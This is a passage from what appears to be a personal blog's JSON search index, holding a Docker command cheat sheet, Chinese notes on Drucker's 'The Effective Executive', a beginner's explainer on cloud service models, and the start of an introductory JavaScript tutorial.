images\ndocker history [imagename] --no-trunc: Show the image layers\ndocker rmi -f $(docker images -q): Remove all docker images\nContainer docker ps: List containers.\ndocker ps --all: List all containers, including the completed ones\ndocker run: Run a docker image as a container.\nRun docker as detach mode:\ndocker run –d –p 5000:5000 registry docker run -d --restart=on-failure/always/no docker commit: Commit a docker container as an image. When a docker commit is performed, this new area of disk is frozen and recorded as a layer with its own identifier.\ndocker attach: Attach local standard input, output, and error streams to a running container\ndocker rm: to remove a container\ndocker top: Display the running processes of a container.\ndocker inspect: Return low-level information on Docker objects.\nDocker logs: can see status inside a running container\ndocker exec [containername] [command]: Run a command in a running container. For example: docker exec -it XXXX /bin/bash\ndocker stop: stop the container.\ndocker rm -f $(docker ps -a -q): delete all Docker containers\nRegistry docker pull: Pull and image from docker registry.\ndocker search: can find images to pull\nOthers Use alias can help the efficiency: alias dps = docker ps\ndocker has following logging level:\ndebug: debug + info + error + fatal info: info + error + fatal error: error + fatal fatal docker -d -l debug: Setup the logging level.\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2018/docker_introduction/","section":"post","tags":["docker"],"title":"Docker Introduction"},{"body":"","link":"http://localhost:1313/series/2017/","section":"series","tags":null,"title":"2017"},{"body":"The Effective Executive Published: Dec 29, 2017 Tags: booknotes Category: Management\nThis is the notes from book by Peter Drucker. According to Drucker, the task of leadership is to create an alignment of strengths, making our weakness irrelevant\nTable of Contents 有效企业管理 企业的管理必须有效，否则企业无法生存。\n管理得好的工厂，一般单调乏味，没有任何激动人心的事件发生。 那些“心中无数决心大”的誓师大会表面是轰轰烈烈，但从本质上看对提高管理的有效性却没有任何帮助； 那些在突发事件中表现英勇的人和事的确激动人心，但我们需要的不是停留在对这些英雄人物大张旗鼓地表彰上，而是要扎扎实实建立避免发生这类事件的机制。\n这使我们认识到有效管理的重要性，有效就要防范于未然，将例外管理变成例行管理。\n管理自己 “管理有效性”的关键，不在于有效地“管理别人”，而在于有效地“管理自己”。\n管理者的有效性\n强调的是“做正确的事情，把事情做正确”； 强调的是“按时做完自己该做的事情并产生成果”； 强调的是把“知识转化为成果”。 管理者的价值不在于任劳任怨，埋头苦干，服从领导或听命于上司，也不在于提供各种精专的知识、工具、观念和术语，更不在于职称、头衔或地位，而在于依靠自身的知识、才干和贡献意识，促进组织产生成果.\n组织中的管理者通常会遇到四种情况，而他自己基本无法控制。每种情况都会向他施加压力，将工作推向无效，使机构运作不灵\n管理者的时间往往只属于别人，而不属于自己 管理者往往被迫按照老一套方法开展工作 只有当别人使用管理者的贡献时，管理者才具有有效性 管理者身处组织之内，但如果他要有效工作，还必须努力认识组织以外的情况 作为一个有效的管理者，必须在思想上养成如下的习惯：\n知道如何利用自己的时间 注意使自己的努力产生必要的成果，而不是工作本身，重视对外界的贡献 把工作建立在优势上--他们自己的优势，善于利用自己的长处，上级、同事和下级的长处 精力集中于少数主要领域。在这少数重要的领域中，如果能有优秀的绩效就可以产生卓越的成果。他们会按照工作的轻重缓急设定优先次序，而且坚守优先次序。他们知道：要事第一。重要的事先做，不重要的事放一放，除此之外也没有其他办法，否则反倒一事无成 善于做出有效的决策。他们知道有效的决策事关处事的条理和秩序问题，也就是如何按正确的次序采取正确的步骤。他们知道一项有效的决策，总是在“不同意见讨论”的基础上做出的判断，它绝不会是“一致意见”的产物。他们知道快速的决策多为错误的决策，真正不可或缺的决策数量并不多，但一定是根本性的决策。他们需要的是正确的战略，而不是令人眼花缭乱的战术。 有效时间管理 管理者工作的失效，乃至失败，往往是因为没有足够的时间去思考如何做正确的事情或把事情做正确。 他们的时间往往被掠夺，使自己陷于日常事物和内部复杂的关系中，疲于奔命，被现实的压力牵着鼻子走，以致忽略了产生成果的方向，忽略了产生成果的外部联系。 进而，随着企业规模的扩大，以及内部专业化分工体系的深化，使他们更看不到外部的机会以及协同的必要。\n有效的管理者知道，时间是一项限制因素。 任何生产程序的产出量，都会受到最稀有资源的制约。而在我们称之为“工作成就”的生产程序里，最稀有的资源就是时间。\n时间的供给，丝毫没有弹性 时间也完全没有替代品 每一位管理者的时间，都有很大部分是被浪费掉的。 表面上看起来，每件事似乎都非办不可，但实际上却毫无意义。\n知识工作者想要取得成果和绩效，就必须着眼于整个组织的成果和绩效。 换句话说，他还得匀出时间来，将目光由自己的工作转到成果上；由他的专业转到外部世界，因为只有外部世界才有绩效可言。 组织规模越大，管理者实际可掌握的时间越少\n管理时间，我们必须先记录时间\n首先要找出什么事根本不必做，这些事做了也完全是浪费时间，无助于成果 时间记录上的哪些活动可以由别人代为参加而又不影响成果 管理者在浪费别人的时间 消除浪费时间的活动：\n找出由于缺乏制度或远见而产生时间浪费的因素 人员过多，也常造成时间浪费 组织不健全，会议太多。一个人人都随时开会的组织，必是一个谁都不能做事的组织。原则上，一位管理者的时间，绝不能让开会占用太多。会议太多，表示职位结构不当，也表示单位设置不当。会议太多，表示本应由一个职位或一个单位做的工作，分散到几个职位或几个单位去了。同时表示职责混乱，以及未能将信息传送给需要信息的人员 信息功能不健全 管理他人 人总有一种倾向，高估自己地位的重要性，认为许多事非躬亲不可。 管理者的任务，就是要充分运用每一个人的长处，共同完成任务。\n管理者的任务不是去改变别人。管理者的任务，在于运用每一个人的才干。\n“用人所长”是指用“下属”所长或发挥“下属”的长处。 这是不够的，现在管理者还应该懂得，如何发挥上司所长和自己所长，这样才能使每一个管理者的各方关系（或称“管理关系”）协调起来，才能使管理工作变得有效。\n我们任用的人才，充其量也只能在某一项能力方面比较优秀。而某一项能力较强，自然在其他能力方面就不免平平了。 我们必须学会这么一种建立组织的方式：若某人在某一重要领域具有一技之长，就要让他充分发挥这一特长。\n由下属自己设定的目标，往往会出乎主管的意料之外。 换言之，主管和下属看问题的角度往往极不相同。 下属越是能干，就越愿意自己承担责任，他们的所见所闻，所看到的客观现实、机会和需要，也越与他们的主管不同。\n对管理者的有效性而言，最重要的人物，往往不是管理者直接控制的下属，而是其他部门的人，即所谓“旁系人士”，或是管理者本人的上司。 一位管理者如果不能与这些人士主动接触，不能使这些人利用他的贡献，他本身就没有有效性可言。\n重视贡献，还可将管理者的先天弱点--过分依赖他人，以及属于组织之内--转变为力量，进而创造出一个坚强的工作团队来\n有效的管理者从来不问：”他能跟我合得来吗？“ 他们问的是：”他贡献了什么？“他们从来不问：”他不能做什么？“他们问的是：”他能做些什么？“\n真正”苛求的上司“（实际上懂得用人的上司大部分都是\u0026quot;苛求”的上司），总是先发掘一个人最擅长做些什么，再来“苛求”他做些什么 所以，这个人能够做些什么，才是组织器重他的原因。而他不能做什么，则仅是他的限制，仅此而已。\n卓有成效的管理者在用人时，会先考虑某人能做些什么，而不是先考虑职位的要求是什么。 换言之，有效的管理者在决定将某人安置于某职位之前，会先仔细考虑这个人的条件，而且他考虑时绝不会只局限于这个职位\n考评问自己四个问题：\n哪方面的工作他确实做得很好？ 哪方面的工作他可能会做得更好？ 为了充分发挥他的长处，他还应该再学习或获得哪些知识？ 如果我有个儿子或女儿，我愿意让我的子女在他的指导下工作么？ a. 如果愿意，理由是什么？ b. 如果不愿意，理由是什么？\n有效的管理者知道，要说人的能力，就必须具体到能不能完成任务。 他们不喜欢笼统地说某人是个”能人“，而只会说某人在完成某项任务方面是个“能人”。 这些管理者总是结合具体任务来寻找别人的长处，以达到用人之长的目的\n将一位不称职的人调职，与其说是反映了对这个人的看法，倒不如说是对任命他的人有看法。 某人不称职，是不称此职，并不是说他也肯定不能胜任别的职务\n运用上司的长处，也是下属工作卓有成效的关键。 要使其上司能发挥其所长，不能靠唯命是从，应该从正确的事情着手，并以上司能够接受的方式向其提出建议。 与其说是“提什么建议”的问题，倒不如说是“如何提这一建议”的问题。 换言之，向上司提出建议时，应考虑的不光是轻重是非，更重要的是陈述的先后顺序。 如果说上司长于政治能力，那么我们提出的报告就应以政治方面的问题居先，这样才能使上司易于掌握问题的重心，从而易于发挥其所长，使新政策得以成功。 俗话说“观人易，察己难。”观察别人，我们都是“专家”。 因此，要使上司有效其实不难。问题只在于应了解上司的长处，知道上司能做些什么。 只在于重视上司的长处，使其弱点不产生影响。协助上司发挥其所长，是促使管理者有效的最好方法\n有效管理者特征 管理者要做到卓有成效，必须明白自己的长处和短处；管理者应该使自己的长处得到发挥，而使自己的短处变得与工作无关。\n有效管理者的特征是什么？就是关注时间管理，关注系统思考，关注培养接班人。\n有效的管理者和不称职的管理者，在类型性格及才智方面，很难加以区别。 有效性是一种后天的习惯，是一种实践的综合。既然是一种习惯，便是可以学会的\n将管理人员变成SBU（策略事业单位） 即每个管理者都是一个独立作战的经营体，每个人都有自己的目标市场和市场目标，自主制定自己的市场策略，以最快的速度去创造新的市场、新的需求。\n大多数管理者重视勤奋，但忽略成果。 他们耿耿于怀的是：所服务的组织和上司是否亏待了他们，是否该为他们做些什么。 他们抱怨自己没有职权，结果是做事没有效果。\n一个人如果只知道埋头苦干，如果老是强调自己的职权，那不论其职位有多高，也只能算是别人的“下属”。 反过来说，一个重视共享的人，一个注意对成果负责的人，即使他位卑职小，也应该算是“高层管理人员”，因为他能对整个机构的经营绩效负责。\n卓有成效的管理者都懂得这一点，因为他们都有想把工作干得更好的心理动力，总想了解别人需要什么、发现了什么以及能理解写什么。 他们会向机构内部人员提出这样的问题：为便于你为机构做出贡献，你需要我做些什么贡献？需要我在什么时候，以哪种形式，用什么方式来提供这些贡献？\n管理者往往以为他们首要的任务不在于因人设事，而在于因事设人。 我们要坚持因事设人而非因人设事。 人事的决策，要凭公平和公正，否则就会赶走了好人，或破坏好人的干劲。\n在一个组织中，自认为有管理天赋的管理者，往往并没有良好的人际关系。 而在自己的工作上和人际关系上都比较重视贡献的管理者，往往都有良好的人际关系，他的工作也因此富有成效，这也许是所谓”良好的人际关系“的真义所在。\n能建立起第一流经营体制的管理者，通常不会与周围的同事及下属保持过分亲密的关系。 不能根据个人的好恶来挑选人才，而应当看他们能干些什么，看他们的工作表现，绝不能看他们是否顺从自己。 因此，为了确保能够选用适当的人选，管理者应该与直接的同事或下属保持适当的距离\n关于决策 一位管理者如果天天要做决策，时时要做决策，那恰恰说明他是个疏懒和无效的人。\n有效的管理者不做太多的决策：\n他们重视的，是分辨什么问题是例行性的，什么问题是策略性的，而不重视“解决问题”。 他们的决策是最高层次的、观念方面的少数重大决策，他们致力于找出情势中的常熟。 所以，他们给人的印象，是决策往往需要宽松的时间。 他们认为操纵很多变数的决策技巧，只是一种缺乏条理的思考方法。 他们希望知道一项决策究竟涵盖什么，应符合哪种基本的现实。 他们需要的是决策的结果，而不是决策的技巧；他们需要的是合乎情理的决策，而不是巧妙的决策。 有效的管理者知道什么时候应依据原则做决策，什么时候应依据实际情况需要做决策。 他们知道最骗人的决策，是正反两面折中的决策，他们能分辨正反两面的差异。 他们知道在整个决策过程中，最费时的不是决策本身，而是决策的推行。一项决策如果不能付诸行动，就称不上是真正的决策，最多只是一种良好的意愿。 也就是说，有效的决策虽然是以高层次的理性认识为基础，但决策的推行必须尽可能地接近工作层面，必须力求简单 有效的管理者都知道一项决策不是从搜集事实开始，而是先有自己的见解。 这样做是正确的。因为凡是在某一领域具有经验者，都应该有他的见解。假如说一个人在某一方面经验丰富，而竟然没有见解，那就说明此人没有敏锐的观察力，头脑迟钝。 人总是从自己的见解开始，所以要求人家从搜索事实开始，是不符合实际的。 其结果是，他所搜集的事实，必是以他自己既有的结论为根据；他既然已先有了结论，必能搜索到许多事实。 干过统计工作的人都能体会到这一点，所以往往最不相信统计数字。 统计工作者也许也知道提供数字者的立场，也许不知道提供数字者的立场，但是他知道数字的可疑。\n有效的管理者会运用反面意见。 只有这样，他才能避免为‘似是而非’的看法所征服；他才能得到‘替代方案’，以供他选择和决定； 他也才能在万一决策行不通时不至于迷茫，同时，鼓励反面意见，可以启发他本人的想象力，启发与他公事者的想象力。 反面意见能把‘言之有理’者转化为‘正确’，再把‘正确’转化为‘良好的决策’。\n我们不敢说所有的决策都会让人觉得痛苦，但实际上有效的决策执行起来往往会让人产生不愉快的感觉。 只要决策是正确的，就没有理由因其执行困难，因其可怕，或因其麻烦而退却。\n要学会区分“例常事件”和“例外事件”，学会制定“原则、政策、制度或规程”，通过授权、让工作者或当事人去处理重复发生的“例常事件”。 决策的目标及边界条件就是，“在集中政策的条件下，充分发挥各业务主管的能动性和才干”。\n在一个现代的组织里，如果一位知识工作者能够凭借其职位和知识，对该组织负有贡献的责任，因而能实质地影响该组织的经营能力及达成的成果，那么他就是一位管理者。 这样一位管理者，不能仅以执行命令为满足，他必须能做决策，并承担起做出贡献的责任。\n所谓“折中”，实际上有两种:\n第一种“折中”，即俗语所谓“半片面包总比没有面包好”。 第二种“折中”，则可用古代所罗门王审判两位妇人争夺婴儿的故事来说明：“与其要回半个死孩子，不如保全婴儿性命，将婴儿送与对方好”。 第一种“折中”，仍能符合边界条件，因为半片面包本是为了充饥，半片面包仍然是面包。第二种“折中”，却完全不符合边界条件：婴儿是一个生命，半个婴儿就没有生命可言，只是个尸体了 关于决策是否容易被他人接受的问题，如果老是要考虑如何才能被他人接受，又怕他人会反对，那就完全是浪费时间，不会有任何结果。 世界上的事，你所担心的往往永不出现，而你从来没有担心的，却可能忽然间变成极大的阻碍。 这就是说，如果你一开头就问“这样做恐怕别人不肯接受吧！”那你永远不会有结果。 因为在你这样考虑时，通常总是不敢提出最重要的结论，所以你也得不到有效和正确的答案\n大型组织的基本弱点之一，是中层人士很少有决策训练的机会，以致难以担任高层的决策职位。 执行层的经理人，越早学会风险及不定情况下的判断和决策，这一弱点就能越早消除。 如果我们在日常工作中，一直是只适应而不知思考，一直是只凭感觉而不凭知识和分析，那么执行层的主管人员将永远难以进步，将来他们升迁到了高层职位，开始面对策略性的决策时，必会感到非常生手。\n组织有效性 一个组织如果离开了现实的价值贡献和长期的价值承诺，就会失去存在下去的理由，内部也容易涣散，产生混乱甚至解体。\n一个组织可以容忍一个人的短处，但绝不可以容忍一个人的“恶劣品行或腐败”，绝不能任用“缺乏良知和良心”的人。\n组织是社会的一种器官，只有能为外部环境做出自己的贡献，才能算有所成就。 但是，当组织的规模日益扩大，并且看来日益成功时，其内部的种种事物也将变得更多，这些事物将占据管理者更多的兴趣、精神和能力，使其难以顾及自己的真正任务，无法为外界提供有效的服务。\n如何决定优先，研究起来确实很复杂。 不过我们可以说，在决定哪些应该优先，哪些可以延缓这个问题上，最重要的并不是分析，而是拿出应有的勇气来。\n重将来而不重过去 重视机会，不能只看到困难 选择自己的方向，而不盲从 目标要高，要有新意，不能只求安全和方便 任何一个组织都必须时时注入新血。 如果任何职位都只是在原有名单中找人提升，这组织必将萎缩。 问题是新人不宜用于风险最大之处，例如高层职位，或主持某一新工作的职位。 任用新人，可用在“比高层略低”的职位上，用在已有成规或目标明确的职位上。 推陈才能出新，这是放诸四海而皆准的原则。\n建立反馈制度，可以检讨命令的执行；而最可靠的反馈，却在于亲自视察。 若想了解赖以做出决策的前提是否仍然有效，或者是否已经过时，只有亲自检查才最为可靠。\n关于数字统计 自从有了电脑，从前无法获得的大量计量资料，现在可以通过它提供了。 然而，通常只有组织内部的资料，才是可以量化的，例如成本和生产数据、医院病人的统计数据、培训报告等。 至于外部的情况，则大量难以量化，即使能够量化，得到的也只是滞后的信息。\n对于外部的情况，真正重要的不是趋势，而是趋势的转变。 趋势的转变才是决定一个机构及其努力的成败关键。对这种转变，必须要有所察觉，转变是无法计量，无法界定，无法分类的。 管理者可能会因此失去觉察力（对情况的觉察），而仅仅重视事实（即情况发生之后的数字）了。 这样一来，大量的电脑信息反而会使他们与外界的实际隔离。\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/the_effective_executive/","section":"post","tags":["booknotes"],"title":"The Effective Executive"},{"body":"Cloud for Dummy Published: Sep 04, 2017 Tags: cloud Category: ComputerScience\nThis is a blog to explain what cloud is to dummies.\nTable of Contents Introduction Five main principles of cloud computing:\nPooled resources: Available to any subscribing users Virtualization: High utilization of hardware assets Elasticity: Dynamic scale without CAPEX Automation: Build, deploy, configure, provision, and move, all without manual intervention Metered billing: Per-usage business model; pay only for what you use The cloud offers the illusion of infinite resources, available on demand. You no longer need to play the guessing game of how many users need to be supported and how scalable the application is. The cloud takes care of the peaks and troughs of utilization times. In the world of the cloud, you pay for only the resources you use, when you use them. This is the revolutionary change: the ability to handle scale without paying a premium. In this realm of true utility computing, resource utilization mirrors the way we consume electricity or water.\nDeployment models Application deployment models: CAPEX (up-front capital expenditure) vs OPEX (ongoing operational costs)\nCloud ready If you can answer “yes” to some or all of the following questions, you may be cloud-ready:\nDo you have automated scripts for setting up the operating system and installing all necessary software? Do you package your software in such a way that all the configuration files are bundled with the binary artifacts, ready for one-click deployment? Do you run your software stack inside of virtual machines that can be cloned? Are common maintenance tasks (such as vacuuming the database, announcing maintenance windows, and backing up data) happening automatically or easily automated with a single click? Is your software designed to scale horizontally by adding new web servers or other machines? Cloud evolution On the software side of the cloud evolution are three important threads of development:\nvirtualization SOA SaaS Two of these are technological, and the third relates to the business model.\nSOA We see SOA as the logical extension of browser-based standardization applied to machine-to-machine communication.\nThings that humans did through browsers that interacted with a web server are now done machine-to-machine using the same web-based standard protocols and are called SOA. SOA makes practical the componentization and composition of services into applications, and hence it can serve as the architectural model for building composite applications running on multiple virtualized instances.\nSOA is a precursor to the cloud. Distributed loosely coupled systems, which formed the basis for SOA, are by now widely used by virtually every organization with an active web presence.\nA remote service publishes its interface (via a WSDL), and a consuming service has to abide by that interface to consume the service. Each SOA building block can play one or both of two roles: service provider or service consumer. The Universal Description Discovery and Integration (UDDI) specification defines a way to publish and discover information about web services. Other service broker technologies include (for example) Electronic Business using eXtensible Markup Language (ebXML).\nWhichever service the service consumers need, they have to take it into the brokers, bind it with respective service, and then use it. Putting this more simplistically, SOA is all about the process of defining an IT solution or architecture, whereas cloud computing is an architectural alternative.\nWe can say that SOA can’t be replaced by cloud computing. Most cloud computing solutions are defined through SOA. They don’t compete—they’re complementary notions.\nSaaS The final software evolution we consider most pertinent to the cloud is SaaS.\nHistorically, enterprise software was sold predominantly in a perpetual license model. In this model, a customer purchased the right to use a certain software application in perpetuity for a fixed, and in many cases high, price. In subsequent years, they paid for support and maintenance at typically around 18 percent of the original price. This entitled the customer to upgrades of the software and help when they ran into difficulty.\nIn the SaaS model, you don’t purchase the software—you rent it. Typically, the fee scales with the amount of use, so the value derived from the software is proportional to the amount spent on it. The customer buys access to the software for a specified term, which may be days, weeks, months, or years, and can elect to stop paying when they no longer need the SaaS offering. Cloud computing service providers have adopted this pay-as-you-go or on-demand model.\nXaaS You may hear a lot of XaaS like IaaS, PaaS, SaaS, FaaS. One metaphors to explain the idea is Pizza service.\nOn the left side (On Premises), you have full control on every step but you have to care all of them. On the right side (SaaS), you do not need to care about all the details but you also have no control of them. Mainly you just as it is.\nThe same rule applies to real cloud services.\nInfrastructure as a Service (IaaS) The lowest level of XaaS is known as IaaS, or sometimes as Hardware as a Service (HaaS).\nA good example of IaaS is the Amazon Elastic Compute Cloud (EC2).\nA user of IaaS is operating at the lowest level of granularity available and with the least amount of prepackaged functionality. An IaaS provider supplies virtual machine images of different operating system flavors. These images can be tailored by the developer to run any custom or packaged application. These applications can run natively on the chosen OS and can be saved for a particular purpose. The user can bring online and use instances of these virtual machine images when needed. Use of these images is typically metered and charged in hour-long increments. Storage and bandwidth are also consumable commodities in an IaaS environment, with storage typically charged per gigabyte per month and bandwidth charged for transit into and out of the system.\nIaaS provides great flexibility and control over the cloud resources being consumed, but typically more work is required of the developer to operate effectively in the environment.\nPlatform as a Service (PaaS) PaaS’s fundamental billing quantities are somewhat similar to those of IaaS: consumption of CPU, bandwidth, and storage operates under similar models.\nExamples of PaaS include Google AppEngine and Microsoft Azure.\nThe main difference is that PaaS requires less interaction with the bare metal of the system. You don’t need to directly interact with or administer the virtual OSs. Instead, you can let the platform abstract away that interaction and concentrate specifically on writing the application. This simplification generally comes at the cost of less flexibility and the requirement to code in the specific languages supported by the particular PaaS provider.\nSoftware as a Service (SaaS) and Framework as a Service (FaaS) SaaS, as described earlier in the chapter, refers to services and applications that are available on an on-demand basis. Salesforce.com is an example.\nFaaS is an environment adjunct to a SaaS offering and allows developers to extend the prebuilt functionality of the SaaS applications. Force.com is an example of a FaaS that extends the Salesforce.com SaaS offering. FaaS offerings are useful specifically for augmenting and enhancing the capabilities of the base SaaS system. You can use FaaS for creating either custom, specialized applications for a specific organization, or general-purpose applications that can be made available to any customer of the SaaS offering. Like a PaaS environment, a developer in a FaaS environment can only use the specific languages and APIs provided by the FaaS.\nBenefits and Risks of SaaS Benefits:\nFaster deployment: because no local installation is required Usage-based pricing: letting you pay only for what you use Less financial risk: with lower up-front cost and try-before-you-buy options Reduced need for on-premises resources: such as servers and IT staff Easier upgrades: with no on-premises software to update Risks:\nRequires trusting a SaaS provider: for availability and data security Can raise legal/regulatory concerns: with storing data outside customer premises Can limit customization: if customers share a multi-tenant application Can be harder to integrate with on-premises applications Can have lower performance than on-premises applications Benefits and Risks of SaaS Software Vendors Benefits:\nOffers potential to reach new customers in broader markets Can sell directly to business decision maker without going through IT Can provide more predictable revenue than traditional licensing Can lower support costs due to shared multi-tenant applications Provides more knowledge about how customers use the application Risks:\nMust demonstrate real value up front, due to try-before-you-buy option Revenue builds up more slowly because of typical SaaS pricing models May lessen ability to sell customization services due to multi-tenant applications Can bring new sales challenges, e.g. customer resistance to the cloud Requires significant business changes, e.g. pricing and sales Private and Hybrid clouds For some users, they may resistant to go public cloud for some reasons. Then private or Hybrid clouds are relevant to them.\nPrivate clouds Private clouds are a variant of generic cloud computing where internal data-center resources of an enterprise or organization aren’t made available to the general public\nBenefits:\nFaster deployment of VMs and applications, because the process is automated Reduced administrative costs, because more of the process is automated Fewer deployment errors, due to automated deployment of standard services Easier cost management, with per-VM chargeback or showback Risks:\nVM administrators find it hard to trust users to deploy their own VMs and applications VM administrators might resist having part of their job automated Defining standard services can be challenging, since users want different things Changing operational process is hard for risk-averse IT departments Hybrid clouds Hybrid clouds combine private and public clouds.\nVMWare, Microsoft, HP, OpenStack, Abiquo have support for private/hybrid cloud solution.\nMapReduce History: Google publish the document of 'Google File System' and MapReduce in 2014. Then Apache project is to make an open source implementation about it.\nThe name MapReduce has its roots in functional programming, inspired by the map and reduce functions first called out in the programming language Lisp. In Lisp, a map takes as input a function and a sequence of values. It then applies the function to each value in the sequence. A reduce combines all the elements of a sequence using a binary operation. For example, it may use + to add all the elements in a sequence.\nMapReduce implementations are sophisticated frameworks for reliable parallel processing in a highly distributed fashion. They specifically allow distributed processing of the map and reduce functions. Provided all map functions are independent of each other, all maps can be done in parallel. The key is any dependencies in the data set. There may in practice be limitations caused by the data source and/or number of CPUs near that data.\nThe set of reducers operating on the same key produced by the map operations can perform the reduction phase in parallel as well.\nOne of the copies of the program is special: the master. The rest are workers assigned work by the master. The master picks idle workers and assigns each one a map task or a reduce task.\nOther important concepts Power usage effectiveness (PUE) Power usage effectiveness (PUE) is a metric used to determine the energy efficiency of a data center.\nRepresentational State Transfer (REST) REST-style architectures consist of clients and servers.\nClients initiate requests to servers; server s process requests and return appropriate responses.\nRequests and responses are built around the transfer of representations of resources. A resource can be any coherent and meaningful concept that may be addressed. A representation of a resource is typically a document that captures the current or intended state of a resource. Conforming to the REST constraints is referred to as being RESTful.\nRESTful means conforming to the REST model of an architecture consisting of clients and servers, where clients initiate requests to servers and servers process requests and return appropriate responses.\nScalability Scalability is about the cloud platform being able to handle an increased load of users working on a cloud application. Elasticity is the ability of the cloud platform to scale up or down based on need without disrupting the business. Without this, the economies of moving a business/application to the cloud don’t make sense.\nDatabase sharding Basic database sharding partitions the database based on who will access that part of the services.\nAttributes between different architectures Critical application attributes in tightly vs loosely coupled architectures:\n+-----------------------+-----------------------+-----------------------+ | | Tightly coupled | Loosely coupled | +-----------------------+-----------------------+-----------------------+ | Technology mix | Homogeneous | Heterogeneous | +-----------------------+-----------------------+-----------------------+ | Data typing | Dependent | Independent | +-----------------------+-----------------------+-----------------------+ | Interface model | API | Service | +-----------------------+-----------------------+-----------------------+ | Interaction style | PRC | Document | +-----------------------+-----------------------+-----------------------+ | Synchronization | Synchronous | Asynchronous | +-----------------------+-----------------------+-----------------------+ | Granularity | Object | Message | +-----------------------+-----------------------+-----------------------+ | Syntactic definition | By convention | Self-describing | +-----------------------+-----------------------+-----------------------+ | Semantic adaptation | By recoding | Via transformation | +-----------------------+-----------------------+-----------------------+ | Bindings | Fixed and early | Delayed | +-----------------------+-----------------------+-----------------------+ | Software objective | Reusability | Broad applicability | +-----------------------+-----------------------+-----------------------+ | Consequences | Anticipated | Unintended | +-----------------------+-----------------------+-----------------------+\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/cloud_for_dummy/","section":"post","tags":["cloud"],"title":"Cloud for Dummy"},{"body":"","link":"http://localhost:1313/tags/frontend/","section":"tags","tags":null,"title":"Frontend"},{"body":"Introduction to Javascript Published: Sep 9, 2017 Tags: web, frontend Category: ComputerScience\nJavascript is the fundumantal programming language for frontend development. This blog introduces the basic concept of Javascript language.\nTable of Contents Javascript Basic First, let's compare Javascript with a OOP programming language C#.\n+-----------------------+-----------------------+ | C#\t| Javascript | +-----------------------+-----------------------+ | Strongly-Typed | Loosely-typed | +-----------------------+-----------------------+ | Static | Dynamic | +-----------------------+-----------------------+ | Classical Inheritance\t| Prototypal | +-----------------------+-----------------------+ | Classes | Functions | +-----------------------+-----------------------+ | Constructors\t| Functions | +-----------------------+-----------------------+ | Methods | Functions | +-----------------------+-----------------------+\nStrongly typed or weakly typed (loosely typed) In general, a strongly typed language is more likely to generate an error or refuse to compile if the argument passed to a function does not closely match the expected type. On the other hand, a weakly typed language may produce unpredictable results or may perform implicit type conversion.\n1var x = 0; 2var isNumber = typeof x == \u0026#34;number\u0026#34;; 3x = new Object(); Duck typing Type is less important, but shape is important\n1function Feed(ani) { ani.Feed() } // accepts any object implements Feed function Dynamic Typing A language is statically typed if the type of a variable is known at compile time. A language is dynamically typed if the type is associated with run-time values, and not named variables/fields/etc.\n1var x = { 2\tname: \u0026#34;Shawn\u0026#34;, 3\tcity: \u0026#34;Atlanta\u0026#34; 4}; 5x.phone = \u0026#34;xxx-xx-xxx\u0026#34;; 6x.makeCall = function() { 7\tcallSomeone(this.phone); 8}; Type Type Coalescing Javascript wants to coalesce values.\n1\t\u0026#34;test \u0026#34; + \u0026#34;me\u0026#34; 2\t\u0026#34;test \u0026#34; + 1 3\t\u0026#34;test \u0026#34; + true 4\t\u0026#34;test \u0026#34; + (1 == 1) 5\t100 + \u0026#34;25\u0026#34; // 10025 Most operators in Javascript are identical to .net, except…\nEquality/NotEqual (==, !=): The means determines equality with coalescing (if necessary) Javascript's identically Equality operators (===, !==) which is similar to .Equal(). Determines quality without coalescing 1\t\u0026#34;hello\u0026#34; == \u0026#34;hello\u0026#34;; // true 2\t1 == 1; // true 3\t1 == \u0026#34;1\u0026#34;; // true 4\t1 === \u0026#34;1\u0026#34;; // false 5\t1 !== \u0026#34;1\u0026#34;; // true Types Primitives Javascript has basic types\nValue types: boolean, string, number Reference Type: object Delegate type: function Special: undefined, null 1var a = typeof 1; //number 2var b = typeof 1.0; // number 3var c = typeof true; // boolean 4var d = typeof false; // boolean 5var e = typeof \u0026#34;hello world\u0026#34;; // string Number Examples of number:\n1, 1.5, 070, 0xffff, 1.34e6, 10.0 Number.MIN_VALUE Number.MAX_VALUE Number.POSITIVE_INFINITY; Number.NEGATIVE_INFINITY; Operator 1var fail = 10/\u0026#34;zero\u0026#34;; // NaN 2var test1 = NaN == NaN; // false 3var test2 = isNaN(NaN); // true 4var test3 = isNaN(fail); //true 5var test4 = isNaN(10); // false 6var test5 = isNaN(\u0026#34;10\u0026#34;); //false 7var test6 = isNaN(\u0026#34;fail\u0026#34;);//true All the following values are false\n1if(\u0026#34;\u0026#34;) 2if(0) 3if(10/0) 4if(null) 5if(undefined) Function Overloading function Javascript does not support function overload.\n1function foo(one) { 2 alert(\u0026#39;first); 3} 4function foo(one, two) { 5 alert(\u0026#39;second\u0026#39;); 6} 7foo(1); // second The second one simply overrule the first one\nArguments object Arguments object is available inside function body only.\n1function foo(one, two, three) { 2\talert(arguments.length); 3} 4foo(1); //1 5foo(1, 2); //2 6foo(1,2,3); //3 Accessing the values through arguments object.\n1function foo() { 2\tfor(var x = 0; x \u0026lt; arguments.length; x++) { 3\talert(arguments[x]); 4\t} 5} 6foo(1, 2, 3); // 1,2,3 All functions return a value If not defined then it's 'undefined'\n1function foo() { 2\treturn; 3} 4var x = foo(); Function is just an object Has properties and member functions\n1function log(s) { alert(\u0026#39;yup\u0026#39;); } 2var x = log.length; // 1 parameter 3var y = log.name; // \u0026#39;log\u0026#39; 4var z = log.toString() // \u0026#39;function log(s) { alert(\u0026#39;yup\u0026#39;); } Function Body Variable \u0026quot;this\u0026quot; applies to the owner of the function\n1var f = function() { 2\talert(this); 3}; 4f(); // [Object Window] 5 6var obj = { 7\tname: \u0026#39;myObj\u0026#39;, 8\tmyFunc: function() { 9\tconsole.log(this.name); 10\t} 11}; 12obj.myFunc(); // \u0026#39;myObj\u0026#39; 13 14var f = obj.myFunc.bind(this); 15f(); // this == global object bind() lets you change the owner.\nFor details, see: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/this\nClosures JavaScript closure makes it possible for a function to have \u0026quot;private\u0026quot; variables.\n1var add = (function () { 2 var counter = 0; 3 return function () {return counter += 1;} 4})(); 5 6add(); 7add(); 8add(); 9 10// the counter is now 3 The variable add is assigned the return value of a self-invoking function.\nThe self-invoking function only runs once. It sets the counter to zero (0), and returns a function expression.\nThis way add becomes a function. The \u0026quot;wonderful\u0026quot; part is that it can access the counter in the parent scope.\nThe counter is protected by the scope of the anonymous function, and can only be changed using the add function.\nThe magic 